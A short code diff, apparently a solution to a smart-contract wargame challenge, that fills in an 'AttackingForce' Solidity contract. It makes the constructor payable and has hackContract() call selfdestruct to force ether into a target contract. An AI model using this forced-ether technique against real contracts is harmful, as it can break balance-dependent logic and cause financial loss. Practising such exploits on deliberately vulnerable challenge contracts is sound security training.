@@ -5,11 +5,12 @@ import "./Force.sol";
 contract AttackingForce {
     address public contractAddress;
 
-    constructor(address _contractAddress) {
+    constructor(address _contractAddress) payable {
         contractAddress = _contractAddress;
     }
 
     function hackContract() external {
         // Code me!
+        selfdestruct(payable(contractAddress));
     }
 }
